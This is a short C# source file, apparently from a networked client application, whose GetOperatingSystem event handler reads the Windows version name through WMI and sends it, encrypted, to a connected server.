using Client.Core.Networking;
using Client.Core.Security;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management;
using System.Threading.Tasks;

namespace Client.Core.Events
{
    class GetOperatingSystem
    {
        public static void Execute(string data)
        {
            if(NetworkManager.IsConnected)
            {
                NetworkManager.Connection.SendObject("GetOperatingSystemRep", Cryptography.Encrypt(OSVersion()));
            }
            else
            {
                //TODO, Buffer / Packet queue of some sort
            }
        }

        private static string OSVersion()
        {
            var name = (from x in new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>()
                        select x.GetPropertyValue("Caption")).FirstOrDefault();
            return name != null ? name.ToString() : "Unknown";
        }
    }
}
